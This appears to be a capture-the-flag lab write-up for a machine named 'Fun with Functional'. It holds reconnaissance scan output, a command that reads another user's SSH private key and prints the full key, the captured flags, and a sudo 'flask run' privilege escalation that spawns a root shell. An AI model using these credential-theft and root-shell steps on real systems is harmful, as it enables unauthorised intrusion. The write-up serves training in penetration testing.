@@ -1,0 +1,184 @@
+Fun with Functional
+
+└─$ nmap -A -p- -T4 10.10.86.16
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-28 14:00 GMT
+Nmap scan report for fwf.htb (10.10.86.16)
+Host is up (0.040s latency).
+Not shown: 65533 closed tcp ports (conn-refused)
+PORT     STATE SERVICE        VERSION
+22/tcp   open  ssh            OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   256 26:7c:bd:33:8f:bf:09:ac:9e:e3:d3:0a:c3:34:bc:14 (ECDSA)
+|_  256 d5:fb:55:a0:fd:e8:e1:ab:9e:46:af:b8:71:90:00:26 (ED25519)
+5001/tcp open  commplex-link?
+| fingerprint-strings: 
+|   GenericLines: 
+|     HTTP/1.1 400 Bad Request
+|     Connection: close
+|     Content-Type: text/html
+|     Content-Length: 193
+|     <html>
+|     <head>
+|     <title>Bad Request</title>
+|     </head>
+|     <body>
+|     <h1><p>Bad Request</p></h1>
+|     Invalid Request Line &#x27;Invalid HTTP request line: &#x27;&#x27;&#x27;
+|     </body>
+|     </html>
+|   GetRequest: 
+|     HTTP/1.0 200 OK
+|     Server: gunicorn
+|     Date: Mon, 28 Oct 2024 14:02:03 GMT
+|     Connection: close
+|     Content-Type: text/html; charset=utf-8
+|     Content-Length: 447
+|     <!doctype html>
+|     <title>FUN with functionnal !</title>
+|     <body style="background: url('https://miro.medium.com/max/1200/1*AM83LP9sGGjIul3c5hIsWg.png');background-size: cover;">
+|     <h1>Welcome to Functional Programming!</h1>
+|     <p>Why bother yourself with security when you can code in Haskell ? Yay !</p>
+|     <p>For now let's try something simple, let's start with <a href="/homework">your first homework here.</a></p>
+|     </body>
+|   HTTPOptions: 
+|     HTTP/1.0 200 OK
+|     Server: gunicorn
+|     Date: Mon, 28 Oct 2024 14:02:03 GMT
+|     Connection: close
+|     Content-Type: text/html; charset=utf-8
+|     Allow: GET, OPTIONS, HEAD
+|     Content-Length: 0
+|   RTSPRequest: 
+|     HTTP/1.1 400 Bad Request
+|     Connection: close
+|     Content-Type: text/html
+|     Content-Length: 196
+|     <html>
+|     <head>
+|     <title>Bad Request</title>
+|     </head>
+|     <body>
+|     <h1><p>Bad Request</p></h1>
+|     Invalid HTTP Version &#x27;Invalid HTTP Version: &#x27;RTSP/1.0&#x27;&#x27;
+|     </body>
+|_    </html>
+1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+SF-Port5001-TCP:V=7.94SVN%I=7%D=10/28%Time=671F995B%P=x86_64-pc-linux-gnu%
+SF:r(GenericLines,11E,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nConnection:\x
+SF:20close\r\nContent-Type:\x20text/html\r\nContent-Length:\x20193\r\n\r\n
+SF:<html>\n\x20\x20<head>\n\x20\x20\x20\x20<title>Bad\x20Request</title>\n
+SF:\x20\x20</head>\n\x20\x20<body>\n\x20\x20\x20\x20<h1><p>Bad\x20Request<
+SF:/p></h1>\n\x20\x20\x20\x20Invalid\x20Request\x20Line\x20&#x27;Invalid\x
+SF:20HTTP\x20request\x20line:\x20&#x27;&#x27;&#x27;\n\x20\x20</body>\n</ht
+SF:ml>\n")%r(GetRequest,259,"HTTP/1\.0\x20200\x20OK\r\nServer:\x20gunicorn
+SF:\r\nDate:\x20Mon,\x2028\x20Oct\x202024\x2014:02:03\x20GMT\r\nConnection
+SF::\x20close\r\nContent-Type:\x20text/html;\x20charset=utf-8\r\nContent-L
+SF:ength:\x20447\r\n\r\n\n\x20\x20\x20\x20<!doctype\x20html>\n\x20\x20\x20
+SF:\x20<title>FUN\x20with\x20functionnal\x20!</title>\n\x20\x20\x20\x20<bo
+SF:dy\x20style=\"background:\x20url\('https://miro\.medium\.com/max/1200/1
+SF:\*AM83LP9sGGjIul3c5hIsWg\.png'\);background-size:\x20cover;\">\n\x20\x2
+SF:0\x20\x20<h1>Welcome\x20to\x20Functional\x20Programming!</h1>\n\x20\x20
+SF:\x20\x20<p>Why\x20bother\x20yourself\x20with\x20security\x20when\x20you
+SF:\x20can\x20code\x20in\x20Haskell\x20\?\x20Yay\x20!</p>\n\x20\x20\x20\x2
+SF:0<p>For\x20now\x20let's\x20try\x20something\x20simple,\x20let's\x20star
+SF:t\x20with\x20<a\x20href=\"/homework\">your\x20first\x20homework\x20here
+SF:\.</a></p>\n\x20\x20\x20\x20</body>\n\x20\x20\x20\x20")%r(HTTPOptions,B
+SF:3,"HTTP/1\.0\x20200\x20OK\r\nServer:\x20gunicorn\r\nDate:\x20Mon,\x2028
+SF:\x20Oct\x202024\x2014:02:03\x20GMT\r\nConnection:\x20close\r\nContent-T
+SF:ype:\x20text/html;\x20charset=utf-8\r\nAllow:\x20GET,\x20OPTIONS,\x20HE
+SF:AD\r\nContent-Length:\x200\r\n\r\n")%r(RTSPRequest,121,"HTTP/1\.1\x2040
+SF:0\x20Bad\x20Request\r\nConnection:\x20close\r\nContent-Type:\x20text/ht
+SF:ml\r\nContent-Length:\x20196\r\n\r\n<html>\n\x20\x20<head>\n\x20\x20\x2
+SF:0\x20<title>Bad\x20Request</title>\n\x20\x20</head>\n\x20\x20<body>\n\x
+SF:20\x20\x20\x20<h1><p>Bad\x20Request</p></h1>\n\x20\x20\x20\x20Invalid\x
+SF:20HTTP\x20Version\x20&#x27;Invalid\x20HTTP\x20Version:\x20&#x27;RTSP/1\
+SF:.0&#x27;&#x27;\n\x20\x20</body>\n</html>\n");
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 222.65 seconds
+
+└─$ feroxbuster --url http://10.10.86.16:5001 --wordlist  /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-big.txt -t 200
+                                                                                                                                                              
+ ___  ___  __   __     __      __         __   ___
+|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
+|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
+by Ben "epi" Risher 🤓                 ver: 2.11.0
+───────────────────────────┬──────────────────────
+ 🎯  Target Url            │ http://10.10.86.16:5001
+ 🚀  Threads               │ 200
+ 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-big.txt
+ 👌  Status Codes          │ All Status Codes!
+ 💥  Timeout (secs)        │ 7
+ 🦡  User-Agent            │ feroxbuster/2.11.0
+ 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
+ 🔎  Extract Links         │ true
+ 🏁  HTTP methods          │ [GET]
+ 🔃  Recursion Depth       │ 4
+───────────────────────────┴──────────────────────
+ 🏁  Press [ENTER] to use the Scan Management Menu™
+──────────────────────────────────────────────────
+404      GET        4l       34w      232c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
+200      GET       14l       74w      722c http://10.10.86.16:5001/homework
+200      GET        9l       43w      447c http://10.10.86.16:5001/
+404      GET        0l        0w      232c http://10.10.86.16:5001/105827
+[################>---] - 19m   987677/1185241 5m      found:3       errors:67     
+[################>---] - 19m   987668/1185240 846/s   http://10.10.86.16:5001/
+
+
+revershell on /homework : 
+
+cat ../prof/.ssh/id_rsa :
+
+-----BEGIN RSA PRIVATE KEY-----
+MIIEpAIBAAKCAQEA068E6x8/vMcUcitx9zXoWsF8WjmBB04VgGklNQCSEHtzA9cr
+94rYpUPcxxxYyw/dAii0W6srQuRCAbQxO5Di+tv9aWXmBGMEt0/3tOE7D09RhZGQ
+b68lAFDjSSJaVlVzPi+waotyP2ccVJDjXkwK0KIm6RsACIOhM9GtI2wyZ6vOg4ss
+Nb+7UY60iOkcOAWP09Omzjc2q7hcE6CuV6f7+iObamfGlZ4QQ5IvUj0etStDD6iU
+WQX4vYewYqUz8bedccFvpC6uP2FGvDONYXrLWWua7wlwSgOqeXXxkG7fxVqYY2++
+6ZVm8RE7TpPNxsQNDwpnxOiwTxGMgCrIMxgRVwIDAQABAoIBAQCTLXbf+wQXvtrq
+XmaImQSKRUiuepjJeXLdqz1hUpo7t3lKTEqXfAQRM9PG5GCgHtFs9NwheCtGAOob
+wSsR3TTTci0JIP4CQs4+nez96DNl+6IUmhawcDfrtlGwwZ/JsvPDYujnyziN+KTr
+7ykGoRxL3tHq9Qja4posKzaUEGAjTz8NwrhzB6xatsmcWBV0fFoWzpS/xWzW3i7F
+gAoYxc6+4s5bKHsJima2Aj5F3XtHfipkMdBvbl+sjGllgiQn/oEjYMIX5wc7+se2
+o7FERO2oy3I5jUOlULsr9BwQpNFA2Qenc4Wc7ghb0LfCVaUs/RHQ7IQ4F3yp/G67
+54oLue6hAoGBAPCe+WsnOXzhwQ9WXglhfztDR1lcwSFMeHZpcxYUVqmVEi2ZMLll
+B67SCri9lHHyvBtrH7YmZO5Q9UcGXdLCZGmbkJUdX2bjqV0zwwx1qOiVY8LPnZSJ
+LJN+0p1dRHsO3n4vTHO8mVuiM5THi6pcgzSTggIhS+e1ks7nlQKiBuD/AoGBAOE2
+kwAMtvI03JlkjvOHsN5IhMbOXP0zaRSrKZArDCcqDojDL/AQltQkkLtQPdUPJgdY
+3gOkUJ2BCHNlIsAtUjrTj+T76N512rO2sSidOEXRDCc+g/QwdgENiq/w9JroeWFc
+g9qM3f2cl/EkjxRgiyuTfK6mbzcuMSveX4LfCXepAoGAd2MZc+4ZWvoUNUzwCY2D
+eF8QVqlr9d6gYng9rvXWbfvV8iPxBfu3zSjQQwtlTQhYBu6m5FS2fXxTxrLE+J6U
+/cU+/o19WWqaDPFy1IrIjOYagn1KvXk2UdR6IbQ2FyywfkFvmHk6Sjn3h9leVd/j
+BcIunmnw5H214s0KpSzJZvcCgYA5Ca9VNeMnmIe+OZ+Swezjfw5Ro3YdkmWsnGTc
+ZGqhiJ9Bt91uOWVZuSEGr53ZVgrVlYY0+eqI2WMghp60eUX4LBinb71cihCnrz9S
+/+5+kCE51zVoJNXeEmXrhWUNzo7fP6UNNtwKHRzGL/IkwQa+NI5BVVmZahN9/sXF
+yWMGcQKBgQDheyI7eKTDMsrEXwMUpl5aiwWPKJ0gY/2hS0WO3XGQtx6HBwg6jJKw
+MMn8PNqYKF3DWex59PYiy5ZL1pUG2Y+iadGfIbStSZzN4nItF5+yC42Q2wlhtwgt
+i4MU8bepL/GTMgaiR8RmU2qY7wRxfK2Yd+8+GDuzLPEoS7ONNjLhNA==
+-----END RSA PRIVATE KEY-----
+
+ssh prof@<IP> -i id_rsa
+
+cat user.txt : EPI{h4sK377_C4n_83_r3vsh3ll_4s_W3lL}
+
+
+sudo -l
+
+User prof may run the following commands on funwithfunctional:
+    (root) NOPASSWD: /usr/bin/flask run
+
+$ cat > shell.py << EOF
+> #!/usr/bin/env python3
+> 
+> import pty
+> pty.spawn("/bin/bash")
+> EOF
+$ export FLASK_APP=shell.py
+$ sudo /usr/bin/flask run
+
+cat /root/root.txt : EPI{7VRns_0U7_p17H0N_1S_n0_83773r}
+
+
+
+
